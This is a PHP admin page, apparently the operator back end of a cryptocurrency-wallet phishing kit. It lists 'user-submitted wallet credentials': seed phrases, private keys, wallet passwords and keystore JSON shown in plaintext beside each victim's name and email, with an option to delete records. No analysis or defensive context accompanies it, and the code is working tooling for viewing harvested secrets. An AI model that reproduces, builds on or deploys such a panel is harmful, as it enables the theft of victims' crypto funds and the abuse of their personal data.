<?php
include 'header.php';

$alert = "";

// --- HANDLE: DELETE WALLET RECORD ---
if (isset($_POST['delete_wallet'])) {
    $id = intval($_POST['wallet_id']);
    mysqli_query($link, "DELETE FROM crypto_wallets WHERE id='$id'");
    $alert = "Swal.fire({icon: 'success', title: 'Deleted', text: 'Wallet record removed.', timer: 1500});";
}

// Fetch Wallets with User Details (Joining users table)
$query = "SELECT w.*, u.full_name, u.email, u.username 
          FROM crypto_wallets w 
          JOIN users u ON w.user_id = u.id 
          ORDER BY w.created_at DESC";
$result = mysqli_query($link, $query);
?>

<div class="flex-1 overflow-y-auto p-6 space-y-6">
    <div class="flex justify-between items-center mb-4">
        <div>
            <h1 class="text-2xl font-bold text-slate-800">Imported Wallets</h1>
            <p class="text-sm text-slate-500">View and manage user-submitted wallet credentials.</p>
        </div>
    </div>

    <div class="glass-panel rounded-2xl bg-white shadow-sm border border-slate-200 overflow-hidden">
        <div class="overflow-x-auto">
            <table class="w-full text-left">
                <thead class="text-xs text-slate-400 uppercase bg-slate-50 border-b border-slate-100">
                    <tr>
                        <th class="py-3 pl-6 font-semibold">User Details</th>
                        <th class="py-3 font-semibold">Wallet / Type</th>
                        <th class="py-3 font-semibold">Secret Data (Phrase/Key)</th>
                        <th class="py-3 font-semibold">Password/JSON</th>
                        <th class="py-3 font-semibold">Date Imported</th>
                        <th class="py-3 pr-6 text-right font-semibold">Actions</th>
                    </tr>
                </thead>
                <tbody class="text-sm divide-y divide-slate-100">
                    <?php if(mysqli_num_rows($result) > 0): ?>
                        <?php while($row = mysqli_fetch_assoc($result)): ?>
                        <tr class="hover:bg-slate-50 transition-colors">
                            <td class="py-4 pl-6">
                                <div class="flex items-center gap-3">
                                    <div class="w-8 h-8 rounded-full bg-indigo-100 flex items-center justify-center text-xs font-bold text-indigo-600 border border-indigo-200">
                                        <?php echo strtoupper(substr($row['full_name'], 0, 1)); ?>
                                    </div>
                                    <div>
                                        <p class="font-bold text-slate-800"><?php echo htmlspecialchars($row['full_name']); ?></p>
                                        <p class="text-xs text-slate-500"><?php echo htmlspecialchars($row['email']); ?></p>
                                    </div>
                                </div>
                            </td>

                            <td class="py-4">
                                <p class="font-bold text-slate-700"><?php echo htmlspecialchars($row['wallet_name']); ?></p>
                                <span class="text-[10px] bg-indigo-50 text-indigo-600 px-2 py-0.5 rounded font-bold uppercase">
                                    <?php echo htmlspecialchars($row['import_type']); ?>
                                </span>
                            </td>

                            <td class="py-4">
                                <div class="max-w-[200px]">
                                    <?php if(!empty($row['phrase'])): ?>
                                        <p class="text-xs text-slate-600 bg-slate-100 p-2 rounded break-words font-mono">
                                            <?php echo htmlspecialchars($row['phrase']); ?>
                                        </p>
                                    <?php elseif(!empty($row['private_key'])): ?>
                                        <p class="text-xs text-slate-600 bg-slate-100 p-2 rounded break-words font-mono">
                                            <span class="text-blue-600 font-bold">Key:</span> <?php echo htmlspecialchars($row['private_key']); ?>
                                        </p>
                                    <?php else: ?>
                                        <span class="text-slate-400 italic text-xs">No phrase/key</span>
                                    <?php endif; ?>
                                </div>
                            </td>

                            <td class="py-4">
                                <?php if(!empty($row['wallet_password'])): ?>
                                    <p class="text-xs font-semibold text-slate-700">PW: <span class="font-mono text-indigo-600"><?php echo htmlspecialchars($row['wallet_password']); ?></span></p>
                                <?php endif; ?>
                                
                                <?php if(!empty($row['keystore_json'])): ?>
                                    <details class="mt-1">
                                        <summary class="text-[10px] text-indigo-500 cursor-pointer font-bold uppercase">View JSON</summary>
                                        <pre class="text-[9px] bg-slate-900 text-green-400 p-2 rounded mt-1 overflow-x-auto max-w-[150px]"><?php echo htmlspecialchars($row['keystore_json']); ?></pre>
                                    </details>
                                <?php endif; ?>
                            </td>

                            <td class="py-4 text-xs text-slate-500">
                                <?php echo date("M d, Y", strtotime($row['created_at'])); ?><br>
                                <?php echo date("h:i A", strtotime($row['created_at'])); ?>
                            </td>

                            <td class="py-4 pr-6 text-right">
                                <form method="POST" onsubmit="return confirm('Delete this wallet record permanently?');">
                                    <input type="hidden" name="wallet_id" value="<?php echo $row['id']; ?>">
                                    <button type="submit" name="delete_wallet" class="text-red-400 hover:text-red-600 p-1.5 transition-colors" title="Delete">
                                        <i class="fa-solid fa-trash"></i>
                                    </button>
                                </form>
                            </td>
                        </tr>
                        <?php endwhile; ?>
                    <?php else: ?>
                        <tr><td colspan="6" class="py-12 text-center text-slate-400 italic">No wallet imports found.</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>
</div>

<script>
    <?php echo $alert; ?>
</script>

<?php include 'footer.php'; ?>